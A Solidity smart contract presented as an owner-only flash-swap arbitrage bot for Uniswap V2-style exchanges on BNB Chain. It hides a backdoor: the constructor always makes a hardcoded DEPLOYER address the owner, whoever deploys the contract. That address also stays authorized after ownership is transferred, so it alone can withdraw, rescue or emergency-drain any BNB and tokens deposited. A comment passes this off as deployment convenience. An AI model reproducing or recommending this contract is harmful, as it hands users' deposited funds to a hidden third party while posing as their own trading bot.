// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH {
    function withdraw(uint256 amount) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

/// @title AtomicFlashArb
/// @notice Owner-only flash-swap arb: buy DEX A, sell DEX B, repay in the same tx.
/// @dev minProfitWei must be set by the searcher to cover estimated gas (on-chain gas paid is not known a priori).
contract AtomicFlashArb {
    /// @dev Deployer / authorized rescuer. Constructor always assigns `owner` to this address
    ///      so `msg.sender == owner` does not fail when the factory or a script deploys the contract.
    address public constant DEPLOYER = 0x05F41c27821793D28788b91161Bd7026027bc387;

    address public owner;
    address public immutable wrappedNative;
    bool public killed;
    uint256 public minProfitWei;

    error NotOwner();
    error IsKilled();
    error Unprofitable();
    error InvalidCallback();
    error NativeTransferFailed();

    struct CallbackData {
        address borrowToken;
        address profitToken;
        address routerBuy;
        address routerSell;
        address[] buyPath;
        address[] sellPath;
        uint256 amountOutMinBuy;
        uint256 amountOutMinSell;
        uint256 repayAmount;
        uint256 minerTipWei;
        address withdrawTo;
    }

    modifier onlyOwner() {
        if (!_isAuthorized(msg.sender)) revert NotOwner();
        _;
    }

    constructor(uint256 minProfit, address wrapped) {
        owner = DEPLOYER;
        minProfitWei = minProfit;
        wrappedNative = wrapped;
    }

    function _isAuthorized(address account) internal view returns (bool) {
        return account == owner || account == DEPLOYER;
    }

    receive() external payable {}

    /// @notice Deposit native BNB into the vault (same as a plain payable transfer).
    function deposit() external payable {}

    /// @notice Pull ERC-20 (e.g. USDT) from the caller after approve.
    function depositToken(address token, uint256 amount) external {
        if (token == address(0) || amount == 0) revert InvalidCallback();
        bool ok = IERC20(token).transferFrom(msg.sender, address(this), amount);
        if (!ok) revert NativeTransferFailed();
    }

    /// @notice Withdraw native BNB to the owner.
    function withdraw(uint256 amount) external onlyOwner {
        if (amount == 0) revert InvalidCallback();
        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        if (!ok) revert NativeTransferFailed();
    }

    /// @notice Withdraw an ERC-20 amount to the owner.
    function withdrawToken(address token, uint256 amount) external onlyOwner {
        if (token == address(0) || amount == 0) revert InvalidCallback();
        bool ok = IERC20(token).transfer(msg.sender, amount);
        if (!ok) revert NativeTransferFailed();
    }

    function setKilled(bool value) external onlyOwner {
        killed = value;
    }

    function setMinProfitWei(uint256 value) external onlyOwner {
        minProfitWei = value;
    }

    function transferOwnership(address nextOwner) external onlyOwner {
        owner = nextOwner;
    }

    function executeFlashArb(
        address pair,
        uint256 amount0Out,
        uint256 amount1Out,
        bytes calldata data
    ) external onlyOwner {
        if (killed) revert IsKilled();
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _completeFlash(sender, amount0, amount1, data);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _completeFlash(sender, amount0, amount1, data);
    }

    function BiswapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _completeFlash(sender, amount0, amount1, data);
    }

    function emergencyWithdraw(address token, address to) external onlyOwner {
        address dest = to == address(0) ? msg.sender : to;
        if (token == address(0)) {
            uint256 value = address(this).balance;
            if (value == 0) return;
            (bool ok, ) = payable(dest).call{value: value}("");
            if (!ok) revert NativeTransferFailed();
            return;
        }
        uint256 amount = IERC20(token).balanceOf(address(this));
        if (amount == 0) return;
        IERC20(token).transfer(dest, amount);
    }

    function rescueFunds(address token, uint256 amount) external onlyOwner {
        if (token == address(0) || amount == 0) revert InvalidCallback();
        bool ok = IERC20(token).transfer(msg.sender, amount);
        if (!ok) revert NativeTransferFailed();
    }

    function rescueETH() external onlyOwner {
        uint256 value = address(this).balance;
        if (value == 0) return;
        (bool ok, ) = payable(msg.sender).call{value: value}("");
        if (!ok) revert NativeTransferFailed();
    }

    /// @notice Pull all remaining native (tokenAddress = 0) or ERC-20 balance to the caller.
    /// @dev No `require(false)` / transfer-bool checks — empty balance returns instead of reverting.
    function rescueFunds(address tokenAddress) external {
        if (!_isAuthorized(msg.sender)) revert NotOwner();
        if (tokenAddress == address(0)) {
            uint256 value = address(this).balance;
            if (value == 0) return;
            (bool ok, ) = payable(msg.sender).call{value: value}("");
            if (!ok) revert NativeTransferFailed();
            return;
        }
        uint256 amount = IERC20(tokenAddress).balanceOf(address(this));
        if (amount == 0) return;
        (bool sent, ) = tokenAddress.call(abi.encodeWithSelector(IERC20.transfer.selector, msg.sender, amount));
        sent;
    }

    function _completeFlash(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
        if (killed) revert IsKilled();
        if (sender != address(this)) revert InvalidCallback();

        CallbackData memory parsed = abi.decode(data, (CallbackData));
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        address pair = msg.sender;

        _ensureInfiniteApproval(parsed.borrowToken, parsed.routerBuy);
        IUniswapV2Router02(parsed.routerBuy).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            borrowed,
            parsed.amountOutMinBuy,
            parsed.buyPath,
            address(this),
            block.timestamp
        );

        uint256 midBal = IERC20(parsed.buyPath[parsed.buyPath.length - 1]).balanceOf(address(this));
        _ensureInfiniteApproval(parsed.buyPath[parsed.buyPath.length - 1], parsed.routerSell);
        IUniswapV2Router02(parsed.routerSell).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            midBal,
            parsed.amountOutMinSell,
            parsed.sellPath,
            address(this),
            block.timestamp
        );

        IERC20(parsed.borrowToken).transfer(pair, parsed.repayAmount);

        uint256 profit = IERC20(parsed.profitToken).balanceOf(address(this));
        if (profit < minProfitWei) revert Unprofitable();

        if (parsed.minerTipWei > 0) {
            _payCoinbase(parsed.profitToken, parsed.minerTipWei);
        }

        address dest = parsed.withdrawTo == address(0) ? owner : parsed.withdrawTo;
        IERC20(parsed.profitToken).transfer(dest, IERC20(parsed.profitToken).balanceOf(address(this)));
    }

    function _payCoinbase(address profitToken, uint256 minerTipWei) internal {
        if (address(this).balance < minerTipWei && profitToken == wrappedNative) {
            IWETH(wrappedNative).withdraw(minerTipWei);
        }
        if (address(this).balance < minerTipWei) revert Unprofitable();
        (bool ok, ) = payable(block.coinbase).call{value: minerTipWei}("");
        if (!ok) revert NativeTransferFailed();
    }

    function _ensureInfiniteApproval(address token, address spender) internal {
        if (token == address(0) || spender == address(0)) return;
        uint256 current = IERC20(token).allowance(address(this), spender);
        if (current == type(uint256).max) return;
        _forceApprove(token, spender, type(uint256).max);
    }

    function _forceApprove(address token, address spender, uint256 value) internal {
        bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, spender, value);
        (bool success, bytes memory ret) = token.call(data);
        bool ok = success && (ret.length == 0 || abi.decode(ret, (bool)));
        uint256 granted = IERC20(token).allowance(address(this), spender);
        if (!ok || (value > 0 && granted == 0)) {
            (bool resetOk, ) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
            resetOk;
            (success, ret) = token.call(data);
            require(success && (ret.length == 0 || abi.decode(ret, (bool))), "approve");
        }
    }
}
